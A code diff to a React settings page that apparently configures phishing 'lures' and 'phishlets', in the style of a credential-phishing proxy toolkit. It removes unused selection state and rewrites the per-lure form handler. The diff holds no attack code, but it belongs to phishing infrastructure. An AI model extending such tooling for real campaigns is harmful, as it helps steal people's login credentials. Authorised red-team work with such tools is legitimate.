@@ -58,7 +58,6 @@ export default function Settings() {
   const [showSuccess, setShowSuccess] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [lures, setLures] = useState<Lure[]>([]);
-  const [selectedLure, setSelectedLure] = useState<Lure | null>(null);
   // New state to track form data for each lure independently
   const [lureFormStates, setLureFormStates] = useState<
     Record<string, LureFormState>
@@ -227,12 +226,6 @@ export default function Settings() {
             }
           }
 
-          // Set the selected lure
-          if (lureToSelect) {
-            console.log("Setting selected lure:", lureToSelect.phishlet);
-            setSelectedLure(lureToSelect);
-          }
-
           // Create form states for all lures
           fetchedLures.forEach((lure) => {
             // Skip if we already set up this lure's form state above
@@ -338,9 +331,6 @@ export default function Settings() {
         const selected = lures.find((lure) => lure.id === lureId);
         if (!selected) return;
 
-        // Update the selected lure
-        setSelectedLure(selected);
-
         try {
           // Fetch the full configuration for this lure to get all settings
           const lureConfigResponse = await fetch(
@@ -443,7 +433,7 @@ export default function Settings() {
     }
   };
 
-  // Handle form field changes for a specific lure
+  // Improve the handleLureFormChange function to ensure proper isolation
   const handleLureFormChange = (
     lureId: string,
     field: keyof LureFormState,
@@ -451,13 +441,35 @@ export default function Settings() {
   ) => {
     console.log(`Updating lure ${lureId} field ${field} to:`, value);
 
-    setLureFormStates((prev) => ({
-      ...prev,
-      [lureId]: {
-        ...prev[lureId],
+    setLureFormStates((prev) => {
+      // First, create a copy of the previous state
+      const newState = { ...prev };
+
+      // Ensure this lure has a form state
+      if (!newState[lureId]) {
+        // Find the lure in the lures array
+        const lure = lures.find((l) => l.id === lureId);
+        if (!lure) return prev; // No change if lure not found
+
+        // Create the initial form state for this lure
+        const cleanPath = lure.path.startsWith("/")
+          ? lure.path.substring(1)
+          : lure.path;
+        newState[lureId] = {
+          linkPath: cleanPath,
+          redirectUrl: lure.redirect_url || settings.afterLoginRedirect,
+          useCaptcha: lure.redirector === "main",
+        };
+      }
+
+      // Now update the specific field
+      newState[lureId] = {
+        ...newState[lureId],
         [field]: value,
-      },
-    }));
+      };
+
+      return newState;
+    });
   };
 
   // Modified submit handler for individual lure forms
